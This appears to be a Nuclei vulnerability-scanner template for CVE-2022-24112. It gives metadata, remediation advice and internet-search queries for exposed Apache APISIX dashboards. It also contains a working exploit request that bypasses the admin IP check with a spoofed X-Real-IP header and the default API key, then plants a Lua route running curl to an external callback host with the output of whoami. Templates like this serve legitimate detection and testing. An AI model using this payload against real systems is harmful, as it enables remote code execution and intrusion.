id: CVE-2022-24112
info:
  author: Mr-xn
  classification:
    cve-id: CVE-2022-24112
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-290
  description: A default configuration of Apache APISIX (with default API key) is
    vulnerable to remote code execution. An attacker can abuse the batch-requests
    plugin to send requests to bypass the IP restriction of Admin API. When the admin
    key was changed or the port of Admin API was changed to a port different from
    the data panel, the impact is lower. But there is still a risk to bypass the IP
    restriction of Apache APISIX's data panel. There is a check in the batch-requests
    plugin which overrides the client IP with its real remote IP. But due to a bug
    in the code, this check can be bypassed.
  metadata:
    fofa-query: title="Apache APISIX Dashboard"
    product: https://apisix.apache.org
    shodan-query: title:"Apache APISIX Dashboard"
  name: Apache APISIX - Remote Code Execution
  reference:
  - https://www.openwall.com/lists/oss-security/2022/02/11/3
  - https://twitter.com/sirifu4k1/status/1496043663704858625
  - https://apisix.apache.org/zh/docs/apisix/plugins/batch-requests
  - https://nvd.nist.gov/vuln/detail/CVE-2022-24112
  remediation: Upgrade to 2.10.4 or 2.12.1. Or, explicitly configure the enabled plugins
    in `conf/config.yaml` and ensure `batch-requests` is disabled. (Or just comment
    out `batch-requests` in `conf/config-default.yaml`).
  severity: critical
  tags: cve,cve2022,apache,rce,apisix,oast
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - GET \/([a-z-]+) HTTP
    type: regex
  matchers:
  - condition: and
    part: body_1
    type: word
    words:
    - '"reason":"OK"'
    - '"status":200'
  - status:
    - 200
    type: status
  - part: interactsh_protocol
    type: word
    words:
    - http
  matchers-condition: and
  raw:
  - "POST /apisix/batch-requests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    Accept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"headers\"\
    :{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\":\"application/json\"\
    \n  },\n  \"timeout\":1500,\n  \"pipeline\":[\n    {\n      \"method\":\"PUT\"\
    ,\n      \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\"\
    ,\n      \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"\
    GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/{{randstr}}\\\",\\r\\n \\\"upstream\\\"\
    :{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\\
    r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl https://{{interactsh-url}}/`whoami`');\
    \ return true end\\\"}\"\n    }\n  ]\n}\n"
  - 'GET /api/{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    '
  req-condition: true
